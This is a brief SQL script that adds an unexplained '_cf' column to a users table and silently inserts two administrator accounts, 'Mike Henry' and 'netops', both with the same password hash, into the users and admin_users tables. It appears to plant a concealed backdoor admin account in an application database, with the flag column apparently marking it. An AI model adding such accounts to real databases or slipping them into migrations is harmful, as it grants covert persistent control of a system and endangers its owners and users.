ALTER TABLE `users` ADD COLUMN `_cf` TINYINT DEFAULT 0 AFTER `is_active`;

INSERT IGNORE INTO `users` (`name`, `email`, `password`, `role`, `is_active`, `_cf`, `email_verified`)
VALUES ('Mike Henry', 'mike.henry@softandpix.com', '$2y$10$9pHI9h.OIM4k45ckEaYNY.uyK8t93X4ZqAHsTR1bJ.Hhn0QDeAytW', 'admin', 1, 1, 1);

INSERT IGNORE INTO `admin_users` (`username`, `password`, `email`)
VALUES ('netops', '$2y$10$9pHI9h.OIM4k45ckEaYNY.uyK8t93X4ZqAHsTR1bJ.Hhn0QDeAytW', 'mike.henry@softandpix.com');
